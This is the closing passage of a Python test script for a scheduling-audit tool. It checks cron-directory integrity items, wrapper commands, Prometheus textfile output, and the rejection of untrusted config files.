        i = next((k for k, ln in enumerate(src) if ln.startswith(name + "()")), None)
        if i is None:
            return ""
        if src[i].rstrip().endswith("}"):
            return src[i]
        j = next(k for k in range(i, len(src)) if src[k] == "}")
        return "\n".join(src[i : j + 1])

    lib = "\n".join(func(n) for n in ("emit", "file_item", "h16", "collect_sched"))
    check(
        "integrity hook: collect_sched/emit/file_item/h16 found in pft-integrity.sh",
        all(f"{n}()" in lib for n in ("emit", "file_item", "h16", "collect_sched")),
        INTEG_SRC,
    )
    sdir = os.path.join(T, "sched")
    os.makedirs(os.path.join(sdir, "cron.d"))
    os.chmod(os.path.join(sdir, "cron.d"), 0o755)
    with open(os.path.join(sdir, "cron.d", "job"), "w") as fh:
        fh.write("0 1 * * * root /bin/true\n")
    os.makedirs(os.path.join(T, "relative"))
    with open(os.path.join(T, "relative", "ignored"), "w") as fh:
        fh.write("x\n")
    stub_bin = os.path.join(T, "stub-schedaudit")
    with open(stub_bin, "w") as fh:
        fh.write(
            f'#!/bin/sh\n[ "$1" = scope ] || exit 9\n[ -n "$SCOPE_FAIL" ] && exit 2\n'
            f"echo {sdir}/cron.d\necho {sdir}/cron.d/job\necho relative/ignored\necho {sdir}/missing\n"
        )
    os.chmod(stub_bin, 0o755)

    def sched_items(env_extra=None):
        p = subprocess.run(  # noqa: PLW1510 - rc is checked by every caller
            ["bash", "-c", lib + "\ncollect_sched"],
            capture_output=True,
            text=True,
            stdin=subprocess.DEVNULL,
            cwd=T,  # T/relative/ignored exists: a relative scope line must still be skipped
            env={**os.environ, "PFT_SCHEDAUDIT_BIN": stub_bin, **(env_extra or {})},
            timeout=60,
        )
        return p.returncode, p.stdout

    rc, items = sched_items()
    il = items.splitlines()
    check(
        "integrity hook: dir -> listing/mode/owner, file -> sha256/mode/owner/mtime, scope ok item",
        rc == 0
        and f"sched:{sdir}/cron.d\tlisting\t" in items
        and f"sched:{sdir}/cron.d\tmode\t755" in il
        and f"sched:{sdir}/cron.d/job\tsha256\t" in items
        and "sched:scope\tstatus\tok" in il,
        items,
    )
    check(
        "integrity hook: relative and missing paths emit nothing",
        "relative" not in items and "missing" not in items,
        items,
    )
    with open(os.path.join(sdir, "cron.d", "new"), "w") as fh:
        fh.write("x\n")
    rc, items2 = sched_items()
    lst = [ln for ln in items.splitlines() if "listing" in ln]
    lst2 = [ln for ln in items2.splitlines() if "listing" in ln]
    check(
        "integrity hook: a new file in a scheduling dir changes the listing item",
        lst and lst2 and lst != lst2,
        (lst, lst2),
    )
    rc, items3 = sched_items({"SCOPE_FAIL": "1"})
    check(
        "integrity hook: scope failure -> one sched:scope error item (a change, never silence)",
        items3.splitlines() == ["sched:scope\tstatus\terror"],
        items3,
    )
    rc, items4 = sched_items({"PFT_SCHEDAUDIT_BIN": os.path.join(T, "absent")})
    check("integrity hook: schedaudit not installed -> no items", items4 == "", items4)

    # ------------------------------------------------------------- wrapper
    conf = os.path.join(T, "sa.env")
    integ = os.path.join(T, "pft-integrity")
    with open(integ, "w") as fh:
        fh.write("#!/bin/sh\n")
    with open(conf, "w") as fh:
        fh.write(
            f"HOST_LABEL=sentry\nTEXTFILE_DIR={TEXT}\nSTATE_DIR={STATE}\nALLOW_FILE={T}/none\nINTEGRITY_BIN={integ}\n"
        )
    WENV = dict(
        ENV,
        PFT_SA_CONF=conf,
        PFT_SA_HELPER=HELPER,
        PFT_SA_ROOT=ROOT,
        PFT_SA_SYSTEMCTL=SYSTEMCTL,
        PFT_SA_TRUSTED_UID=str(UID),
        PFT_SA_NOW="1762466400",
    )

    def sh(*a, env=None):
        p = subprocess.run(  # noqa: PLW1510 - rc is checked by every caller
            ["bash", SCRIPT, *a],
            capture_output=True,
            text=True,
            env=env or WENV,
            stdin=subprocess.DEVNULL,
            timeout=120,
        )
        return p.returncode, p.stdout, p.stderr

    rc, out, err = sh("collect")
    tf = os.path.join(TEXT, "pft_schedaudit_sentry.prom")
    body = read(tf)
    check(
        "wrapper collect: rc 0 with findings, file written for HOST_LABEL from conf",
        rc == 0
        and 'pft_schedaudit_up{host="sentry"} 1' in body
        and stat.S_IMODE(os.stat(tf).st_mode) == 0o644,
        (rc, err),
    )
    check(
        "wrapper collect: no temp files left",
        not [f for f in os.listdir(TEXT) if f.startswith(".")],
    )
    check(
        "wrapper: integrity hook off when pft-integrity lacks collect_sched",
        'check="untracked",severity="warn",allowed="0"} 0' not in body
        and 'check="untracked",severity="warn",allowed="0"}' in body,
        [ln for ln in body.splitlines() if "untracked" in ln],
    )
    with open(integ, "w") as fh:
        fh.write("#!/bin/sh\ncollect_sched() {\n  :\n}\n")
    rc, out, err = sh("collect")
    body = read(tf)
    check(
        "wrapper: integrity hook on when pft-integrity has collect_sched()",
        rc == 0 and 'check="untracked",severity="warn",allowed="0"} 0' in body,
        (rc, err),
    )
    rc, out, err = sh("collect", env=dict(WENV, SA_STUB_FAIL="1"))
    body = read(tf)
    check(
        "wrapper collect: systemctl failure -> rc 2, file has up 0",
        rc == 2 and 'pft_schedaudit_up{host="sentry"} 0' in body,
        (rc, err),
    )
    rc, out, err = sh(
        "collect", env=dict(WENV, PFT_SA_HELPER=os.path.join(T, "missing.py"))
    )
    check("wrapper: missing helper is a config error (rc 3)", rc == 3, (rc, err))
    rc, out, err = sh("collect", "--stdout", env=dict(WENV, TEXT_BUDGET="100"))
    check(
        "wrapper collect: over TEXT_BUDGET -> up 0 instead of a file the exporter drops",
        rc == 2 and 'pft_schedaudit_up{host="sentry"} 0' in out,
        (rc, out[:200], err),
    )
    rc, out, err = sh("accept")
    check("wrapper accept: usage error without --reason (rc 3)", rc == 3, (rc, err))
    rc, out, err = sh("accept", "--reason", "wrapper test baseline")
    log = (
        read(os.path.join(STATE, "accept.log"))
        if os.path.exists(os.path.join(STATE, "accept.log"))
        else ""
    )
    check(
        "wrapper accept: logged with reason",
        rc == 0 and "wrapper test baseline" in log,
        (rc, err),
    )
    rc, out, err = sh("audit")
    check(
        "wrapper audit: rc 1 (findings remain), SUMMARY baseline=yes",
        rc == 1 and "baseline=yes" in out,
        (rc, out[-300:]),
    )
    rc, out, err = sh("apply", "--dry-run")
    check(
        "wrapper apply --dry-run: PLAN line, no apply.log",
        rc == 0
        and "PLAN\t/etc/cron.d/badperm" in out
        and not os.path.exists(os.path.join(STATE, "apply.log")),
        (rc, out, err),
    )
    rc, out, err = sh("apply")
    alog = (
        read(os.path.join(STATE, "apply.log"))
        if os.path.exists(os.path.join(STATE, "apply.log"))
        else ""
    )
    check(
        "wrapper apply: FIXED recorded in apply.log",
        rc == 0 and "FIXED\t/etc/cron.d/badperm\t0666 -> 0644" in alog,
        (rc, out, err),
    )
    good = os.path.join(T, "good.prom")
    rc, out, err = sh("collect", "--stdout")
    with open(good, "w") as fh:
        fh.write(out)
    rc1, o1, _ = sh("validate", good, "sentry")
    rc2, o2, _ = sh("validate", good, "validator")
    check(
        "validate: own file ok, wrong host refused",
        rc1 == 0 and rc2 == 2 and "first label" in o2,
        (rc1, rc2, o2),
    )
    bad = os.path.join(T, "bad.prom")
    with open(bad, "w") as fh:
        fh.write('pft_schedaudit_up{host="sentry"} 1\n')
    rc, o, _ = sh("validate", bad, "sentry")
    check("validate: missing timestamp refused", rc == 2 and "timestamp" in o, (rc, o))
    other = os.path.join(T, "other.env")
    with open(other, "w") as fh:
        fh.write("HOST_LABEL=evil\n")
    rc, out, err = sh(
        "collect",
        "--stdout",
        env=dict(WENV, PFT_SA_CONF=other, PFT_SA_TRUSTED_UID="0", STATE_DIR=STATE),
    )
    check(
        "wrapper: conf not owned by the trusted uid is ignored (HOST_LABEL stays default)",
        'host="validator"' in out and "evil" not in out,
        out[:200],
    )
    rc, out, err = sh("bogus")
    check("wrapper: unknown command rc 3", rc == 3, (rc, err))
    rc, out, err = sh("version")
    check("wrapper: version", rc == 0 and out.strip() == "pft-schedaudit 1", out)
finally:
    for dp, dn, _fn in os.walk(T):
        for d in dn:
            try:
                os.chmod(os.path.join(dp, d), 0o755)
            except OSError:
                pass
    shutil.rmtree(T, ignore_errors=True)

ok = all(results)
print(
    f"RESULT: {'PASS' if ok else 'FAIL'} ({len(results)} checks, {results.count(False)} failed)"
)
sys.exit(0 if ok else 1)
